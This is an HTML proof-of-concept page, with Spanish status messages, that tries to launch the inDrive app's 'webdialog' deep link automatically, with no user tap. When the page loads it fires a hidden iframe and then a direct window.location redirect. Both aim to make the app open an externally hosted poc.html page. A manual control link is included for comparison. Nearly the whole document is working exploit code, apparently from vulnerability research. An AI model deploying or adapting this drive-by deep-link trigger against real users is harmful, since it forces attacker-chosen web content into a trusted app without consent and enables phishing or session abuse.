<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>indrive auto-trigger test</title>
</head>
<body>
<h3>Prueba de disparo automatico (sin toque)</h3>
<p id="status">Cargando...</p>

<script>
var DEEPLINK = 'indrive://webdialog?url=' + encodeURIComponent('https://juanestebanmunoz2009-pixel.github.io/indrivepoc/poc.html');
var statusEl = document.getElementById('status');

statusEl.textContent = 'Paso 1: intentando iframe oculto...';
var iframe = document.createElement('iframe');
iframe.style.display = 'none';
iframe.src = DEEPLINK;
document.body.appendChild(iframe);

setTimeout(function () {
  statusEl.textContent = 'Paso 2: intentando window.location directo...';
  try {
    window.location.href = DEEPLINK;
  } catch (e) {
    statusEl.textContent = 'window.location fallo: ' + e;
  }
}, 1500);

setTimeout(function () {
  statusEl.textContent = 'Si segui viendo esta pagina (no te saco de la app), ninguno de los dos metodos automaticos disparo la app. Toca el link manual de abajo para comparar.';
}, 4000);
</script>

<p><a id="manuallink" href="indrive://webdialog?url=https%3A%2F%2Fjuanestebanmunoz2009-pixel.github.io%2Findrivepoc%2Fpoc.html">Link manual (control) - toca aqui</a></p>
</body>
</html>
